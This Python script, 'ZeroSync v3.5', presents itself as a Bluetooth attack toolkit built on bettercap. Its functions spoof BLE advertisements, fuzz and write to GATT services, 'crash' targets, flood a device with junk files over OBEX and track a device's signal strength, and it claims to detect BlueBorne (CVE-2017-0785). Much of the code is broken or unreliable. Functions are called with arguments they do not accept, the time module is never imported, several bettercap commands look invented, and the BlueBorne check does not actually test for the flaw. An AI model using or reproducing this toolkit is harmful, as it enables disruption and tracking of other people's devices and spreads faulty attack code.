
#!/usr/bin/env python3
# ZeroSync v3.5 Final — Cyberpunk Bluetooth Toolkit with Bettercap Integration

import os
import subprocess
from rich.console import Console
from rich.panel import Panel
from rich.prompt import Prompt
from rich.table import Table
import threading
from bluetooth import discover_devices
from sys import exit

console = Console()
scanned_devices = []


scan_thread = None
scan_stop_flag = False

def scan_devices():
    global scanned_devices, scan_stop_flag
    scanned_devices = []
    scan_stop_flag = False
    try:
        console.print(Panel("Scanning for Bluetooth devices... (press stop to cancel)", style="bold cyan"))
        nearby_devices = discover_devices(duration=8, lookup_names=True)
        for addr, name in nearby_devices:
            if scan_stop_flag:
                break
            scanned_devices.append((addr, name))
            console.print(f"[green]Found:[/green] {name} - {addr}")
        console.print(Panel(f"Scan complete. Found {len(scanned_devices)} devices.", style="bold green"))
    except Exception as e:
        console.print(f"[red]Scan failed:[/red] {e}")

def start_scan_thread():
    global scan_thread
    scan_thread = threading.Thread(target=scan_devices)
    scan_thread.start()

def stop_scan():
    global scan_stop_flag
    scan_stop_flag = True
    console.print(Panel("Stopping scan...", style="bold red"))
def run_bettercap_command(command):
    try:
        result = subprocess.check_output(["sudo", "bettercap", "-eval", command], stderr=subprocess.STDOUT, text=True)
        return result
    except subprocess.CalledProcessError as e:
        return f"[ERROR] {e.output.strip()}"

def update_scanned_devices():
    output = run_bettercap_command("ble.show")
    scanned_devices.clear()
    for line in output.splitlines():
        if "BLE" in line and ":" in line:
            scanned_devices.append(line.strip())

def show_scanned_devices():
    if not scanned_devices:
        console.print(Panel("[red]No scanned BLE devices.[/red] Try running a scan first.", border_style="red"))
        return
    table = Table(title="Scanned BLE Devices")
    table.add_column("Index", style="cyan")
    table.add_column("Device Info", style="green")
    for i, dev in enumerate(scanned_devices):
        table.add_row(str(i), dev)
    console.print(table)

def select_device_index():
    if not scanned_devices:
        console.print("[red]No scanned devices to target.[/red]")
        return None
    show_scanned_devices()
    idx = Prompt.ask("Select device index", default="0")
    try:
        return scanned_devices[int(idx)]
    except:
        return None

def ble_spoof_advertisement():
    name = Prompt.ask("Spoofed Name", default="ZeroSync")
    uuid = Prompt.ask("UUID (default: 1234)", default="1234")
    result = run_bettercap_command(f"ble.advertise uuid {uuid} name {name}")
    console.print(result)

def ble_gatt_fuzz():
    device = select_device_index()
    if not device:
        return
    mac = device.split()[1]
    console.print(f"[cyan]Starting GATT fuzz on:[/cyan] {mac}")
    result = run_bettercap_command(f"set ble.target {mac}; ble.gatt.read; ble.gatt.write")
    console.print(result)

def ble_crasher():
    device = select_device_index()
    if not device:
        return
    mac = device.split()[1]
    result = run_bettercap_command(f"set ble.target {mac}; ble.crash")
    console.print(result)

def persistent_chain():
    console.print("[green]Executing persistent chain: Scan → Target → Spoof → GATT Fuzz[/green]")
    run_bettercap_command("ble.recon on")
    update_scanned_devices()
    if scanned_devices:
        device = scanned_devices[0]
        mac = device.split()[1]
        run_bettercap_command(f"set ble.target {mac}; ble.advertise uuid 1234 name 'ZeroSync'; ble.gatt.read; ble.gatt.write")
        console.print(f"[cyan]Attack chain completed on {mac}[/cyan]")
    else:
        console.print("[red]No devices found.[/red]")

def bettercap_bridge():
    console.print(Panel("[bold cyan]Bettercap Bridge[/bold cyan] - Type 'exit' to quit"))
    while True:
        user_cmd = Prompt.ask("[bold magenta]bettercap >[/bold magenta]")
        if user_cmd.lower() in ["exit", "quit"]:
            break
        result = run_bettercap_command(user_cmd)
        console.print(result)


def main_menu():
    while True:
        console.print(Panel("ZeroSync v3.5 - Bluetooth Attack Toolkit", style="bold blue"))
        table = Table(title="Main Menu", show_lines=True)
        table.add_column("Option", justify="center")
        table.add_column("Tool", style="cyan")

        menu_items = [
            ("1", "Scan Devices"),
            ("2", "Show Scanned Devices"),
            ("3", "Stop Scanning"),
            ("4", "BlueBorne Scanner"),
            ("5", "OBEX File Bomb"),
            ("6", "Signal Strength Tracker"),
            ("7", "BLE Spoofer"),
            ("8", "BLE GATT Fuzzer"),
            ("9", "BLE Crasher"),
            ("10", "Bettercap Bridge"),
            ("11", "Persistent BLE Chain"),
            ("0", "Exit")
        ]

        for opt, desc in menu_items:
            table.add_row(opt, desc)

        console.print(table)
        choice = Prompt.ask("[bold green]Choose an option[/bold green]")

        if choice == "1":
            start_scan_thread()
        elif choice == "2":
            show_scanned_devices()
        elif choice == "3":
            stop_scan()
        elif choice == "4":
            blueborne_scanner()
        elif choice == "5":
            target = Prompt.ask("Target MAC for OBEX bomb")
            obex_file_bomb(target)
        elif choice == "6":
            target = Prompt.ask("Target MAC for RSSI tracker")
            signal_strength_tracker(target)
        elif choice == "7":
            target = Prompt.ask("Target MAC for spoofing")
            ble_spoof_advertisement(target)
        elif choice == "8":
            target = Prompt.ask("Target MAC for GATT fuzz")
            ble_gatt_fuzz(target)
        elif choice == "9":
            target = Prompt.ask("Target MAC for crash")
            ble_crasher(target)
        elif choice == "10":
            bettercap_bridge()
        elif choice == "11":
            target = Prompt.ask("Target MAC for persistent chain")
            persistent_chain(target)
        elif choice == "0":
            console.print("[bold red]Exiting ZeroSync...[/bold red]")
            exit()
        else:
            console.print("[red]Invalid option.[/red]")
def signal_strength_tracker(target_mac):
    console.print(Panel(f"Tracking signal strength for {target_mac}", style="bold cyan"))
    try:
        for i in range(10):
            result = subprocess.check_output(f"hcitool rssi {target_mac}", shell=True, text=True)
            console.print(f"[blue]RSSI reading:[/blue] {result.strip()}")
            time.sleep(2)
    except Exception as e:
        console.print(f"[red]Signal tracking failed:[/red] {e}")

def obex_file_bomb(target_mac):
    console.print(Panel(f"Launching OBEX File Bomb at {target_mac}", style="bold red"))
    junk_file = "/tmp/zerosync_junk.txt"
    with open(junk_file, "w") as f:
        f.write("ZEROSYNC" * 10000)
    try:
        for i in range(5):
            os.system(f"obexftp --nopath --noconn --uuid none --bluetooth {target_mac} --channel 9 -p {junk_file}")
            console.print(f"[yellow]Sent junk file {i+1}[/yellow]")
        console.print("[green]OBEX file bomb complete.[/green]")
    except Exception as e:
        console.print(f"[red]OBEX bomb failed:[/red] {e}")

def blueborne_scanner():
    console.print(Panel("Starting BlueBorne scan (CVE-2017-0785)...", style="bold magenta"))
    try:
        from bluetooth import BluetoothSocket, L2CAP
        scanned = []
        nearby_devices = discover_devices(duration=8, lookup_names=True)
        for addr, name in nearby_devices:
            try:
                sock = BluetoothSocket(L2CAP)
                sock.settimeout(2)
                sock.connect((addr, 0x1001))  # ATT channel
                scanned.append((addr, name, "VULNERABLE?"))
                console.print(f"[red]Possible CVE-2017-0785:[/red] {name} ({addr})")
                sock.close()
            except Exception:
                console.print(f"[green]Secure:[/green] {name} ({addr})")
        if not scanned:
            console.print("[green]No vulnerable devices found.[/green]")
    except Exception as e:
        console.print(f"[red]Error during scan:[/red] {e}")
    main_menu()
